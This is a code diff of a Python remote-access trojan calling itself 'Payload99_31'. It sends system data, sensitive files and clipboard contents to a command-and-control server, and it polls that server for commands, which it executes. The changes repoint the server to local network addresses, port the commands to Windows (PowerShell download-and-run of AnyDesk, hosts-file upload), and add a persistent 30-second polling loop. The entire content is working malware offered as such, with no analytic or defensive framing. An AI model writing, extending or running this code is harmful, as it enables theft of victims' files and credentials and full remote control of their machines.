@@ -3,7 +3,7 @@ import platform
 import socket
 import requests
 import subprocess
-import json
+import time
 
 
 kegunaan = """
@@ -37,7 +37,7 @@ def collect_system_info():
 
 
 def send_data_to_c2(data):
-    url_c2 = "http://5.253.43.122:1224/keys"
+    url_c2 = "http://192.168.0.85:1224/keys"
     try:
         response = requests.post(url_c2, json=data, timeout=10)
         if response.status_code == 200:
@@ -61,7 +61,7 @@ def search_sensitive_files():
 
 
 def upload_files_to_c2(files):
-    url_c2 = "http://5.253.43.122:1224/uploads"
+    url_c2 = "http://192.168.0.85:1224/uploads"
     for file in files:
         try:
             with open(file, "rb") as f:
@@ -72,7 +72,7 @@ def upload_files_to_c2(files):
 
 
 def execute_remote_commands():
-    url_c2 = "http://5.253.43.122:1224/cmd"
+    url_c2 = "http://192.168.0.83:1224/cmd"
     try:
         response = requests.get(url_c2, timeout=10)
         if response.status_code == 200:
@@ -82,9 +82,11 @@ def execute_remote_commands():
                     os.system(cmd.replace("SSH_OBJ ", ""))
                 elif cmd == "SSH_CMD":
                     os.system("taskkill /IM python.exe /F")
+                elif cmd == "CALC":
+                    os.system("calc.exe")
                 elif cmd == "SSH_CLIP":
                     clipboard_data = subprocess.check_output("powershell Get-Clipboard", shell=True)
-                    requests.post("http://5.253.43.122:1224/clip", json={"clipboard": clipboard_data.decode()})
+                    requests.post("http://192.168.0.85:1224/api/clip", json={"clipboard": clipboard_data.decode()})
                 elif cmd.startswith("SSH_RUN"):
                     url = cmd.split(" ")[1]
                     payload = requests.get(url).text
@@ -92,16 +94,23 @@ def execute_remote_commands():
                 elif cmd == "SSH_KILL":
                     os.system("taskkill /IM chrome.exe /F && taskkill /IM brave.exe /F")
                 elif cmd == "SSH_ANY":
-                    os.system("wget http://5.253.43.122:1224/anydesk -O /tmp/anydesk && chmod +x /tmp/anydesk && /tmp/anydesk")
+                    os.system(
+                        "powershell -Command Invoke-WebRequest http://192.168.0.85:1224/anydesk -OutFile 'C:\\temp\\anydesk.exe'; Start-Process 'C:\\temp\\anydesk.exe'")
                 elif cmd == "SSH_ENV":
-                    env_files = ["/etc/passwd", os.path.expanduser("~/.bashrc"), os.path.expanduser("~/.zshrc")]
+                    env_files = [os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\Shell\\Favorites"),
+                                 "C:\\Windows\\System32\\drivers\\etc\\hosts"]
                     for file in env_files:
                         if os.path.exists(file):
                             with open(file, "r") as f:
-                                requests.post("http://5.253.43.122:1224/uploads", files={"file": f})
+                                requests.post("http://192.168.0.85:1224/uploads", files={"file": f})
+
     except requests.RequestException:
         print("[-] Error fetching commands from C2.")
 
+def persistent_connection():
+    while True:
+        execute_remote_commands()
+        time.sleep(30)
 
 def main():
     print("[+] Payload99_31 executing...")
@@ -112,7 +121,7 @@ def main():
     if files:
         upload_files_to_c2(files)
 
-    execute_remote_commands()
+    persistent_connection()
     print("[+] Payload99_31 execution completed.")
 
 
